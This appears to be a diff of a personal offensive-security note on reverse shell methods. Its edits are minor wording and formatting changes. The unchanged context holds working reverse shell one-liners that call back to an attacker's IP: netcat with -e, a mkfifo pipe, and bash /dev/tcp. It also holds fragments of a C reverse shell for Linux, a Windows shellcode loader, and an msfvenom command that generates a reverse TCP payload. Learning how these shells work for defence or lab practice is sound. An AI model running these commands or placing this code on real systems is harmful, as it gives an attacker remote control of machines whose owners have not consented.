@@ -11,7 +11,7 @@ description: Different types of Reverse Shell's method.
 ---
 # 1. Simple netcat Reverse Shell
 ---
-## Run command
+## Run
 
 **Attacker's Machine** : `nc -lvnp 4444`
 **Victim's Machine** : `nc -e /bin/sh {attackers IP} port`
@@ -24,7 +24,7 @@ Newer linux machine by default has traditional **netcat** with `GAPING_SECURITY_
 
 > In this case,
 
-## Run Command
+## Run
 
 **Attacker's Machine** : `nc -lvnp 4444`
 **Victim's Machine** : `mkfifo /tmp/p; nc {attackers IP} <port> 0</tmp/p | /bin/sh > /tmp/p 2>&1; rm /tmp/p`
@@ -33,7 +33,7 @@ Newer linux machine by default has traditional **netcat** with `GAPING_SECURITY_
 
 # 3. Bash
 ---
-## Run Command
+## Run
 
 **Attacker's Machine** : `nc -lvnp 4444`
 **Victim's Machine** : `bash -c 'sh -i >& /dev/tcp/<Attacker's IP>/<port> 0>&1'`
@@ -42,7 +42,7 @@ Newer linux machine by default has traditional **netcat** with `GAPING_SECURITY_
 
 # 4. Python
 ---
-## Run Command
+## Run
 
 **Attacker's Machine** : `nc -lvnp 4444`
 **Victim's Machine** : 
@@ -53,7 +53,7 @@ Newer linux machine by default has traditional **netcat** with `GAPING_SECURITY_
 # 5. Reverse Shell in C for Linux 
 ---
 ### Code
-```C
+```cpp
 #include <stdio.h>                          // 1
 #include <sys/socket.h>
 #include <netinet/ip.h>
@@ -92,7 +92,7 @@ int main () {                               // 2
 
 #### Explanation
 1. Firstly, we include the headers, [[Headers, DLLs and Functions#`stdio.h`|<stdio.h>]] , [[Headers, DLLs and Functions#`sys/socket.h`|<sys/socket.h>]], [[Headers, DLLs and Functions#`netinet/ip.h`|<netinet/ip.h>]], [[Headers, DLLs and Functions#`arpa/inet.h`|<arpa/inet.h>]], [[Headers, DLLs and Functions#`unistd.h`|<unistd.h>]].
-2. Create a `main` function.
+2. Create a [[Headers, DLLs and Functions#`main()`|main()]] function.
 3. Write your IP as a string and pass it to the constant character pointer. As we are not going to modify it.
 4. Create a variable `addr` of structure type [[Headers, DLLs and Functions#sockaddr_in|sockaddr_in]]. 
 5. Pass **AF_INET** to `sin_family` field in  [[Headers, DLLs and Functions#sockaddr_in|sockaddr_in]] structure, because **AF_INET** is a constant which tells the system "This socket will use the **IPv4 Internet Protocol**.”
@@ -161,8 +161,8 @@ unsigned char my_payload[]=
 
 unsigned int my_payload_len = sizeof(my_payload);                  // 3
 
-int main(void) {
-	void * my_payload_mem; // memory buffer for payload
+int main() {                                                       // 4
+	void *my_payload_mem; // memory buffer for payload
 	BOOL rv;
 	HANDLE th;
 	DWORD oldprotect = 0;
@@ -192,8 +192,8 @@ int main(void) {
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker's ip> LPORT=4444 -f c
 ```
 ![[images/Pasted image 20250426112907.png]]
-3. 
-
+3. Calculate the size of payload created in **Step 2** with the help of [[Headers, DLLs and Functions#`sizeof()`|sizeof()]] function and store its value in a variable, `my_payload_len`.
+4. 
 ---
 ```C
 #include <windows.h>
